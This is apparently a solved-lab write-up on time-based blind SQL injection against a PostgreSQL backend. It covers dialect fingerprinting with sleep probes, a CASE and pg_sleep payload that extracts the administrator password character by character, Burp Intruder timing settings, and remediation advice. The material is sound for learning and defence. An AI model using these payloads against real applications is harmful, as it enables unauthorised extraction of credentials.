# Lab: Blind SQL injection with time delays and information retrieval

**Date:** February 6, 2026
**Vulnerability Type:** Time-Based Blind SQL Injection
**Difficulty:** Practitioner
**Status:** SOLVED

## 1. Objective
Exfiltrate the `administrator` password from a PostgreSQL database where the application provides no visual feedback, status code changes, or error messages. The only available exfiltration channel is the temporal dimension (response time).

## 2. Discovery & Dialect Fingerprinting
To determine the backend database type, I tested the response times for various SQL sleep syntaxes:

* **Microsoft SQL Server Test:** `'; IF (1=1) WAITFOR DELAY '0:0:10'--`
    * *Result:* Instant response (6ms).
* **PostgreSQL Test:** `' || pg_sleep(10)--`
    * *Result:* **10,000ms+ delay**. (Confirmed PostgreSQL).

## 3. Exploitation (Temporal Brute-force)
I utilized a `CASE` statement to trigger a specific time delay only when a character guess was correct.

### Final Extraction Payload:
`' || (SELECT CASE WHEN (username='administrator' AND SUBSTR(password,§1§,1)='§a§') THEN pg_sleep(3) ELSE pg_sleep(0) END FROM users)--`

### Automation Configuration:
* **Tool:** Burp Intruder (Cluster Bomb).
* **Resource Pool:** Set to **1 concurrent request** to ensure network jitter did not invalidate the timing results.
* **Exfiltration Logic:** Monitored the `Response received` column. "True" results consistently returned at **~6,000ms** (double execution), while "False" results returned in **<200ms**.

## 4. Remediation Recommendations
To prevent time-based exfiltration, the following controls should be implemented:
1.  **Parameterized Queries:** Use prepared statements to ensure the database treats user input as data, not executable code.
2.  **Input Validation:** Sanitize the `TrackingId` cookie against special characters (`;`, `|`, `'`) and enforce strict alphanumeric allow-listing.
3.  **WAF Implementation:** Deploy a Web Application Firewall to detect and block common SQL "sleep" or "delay" signatures.

---
*Note: Lab solved by confirming the vulnerability with the required 10-second sleep signature.*
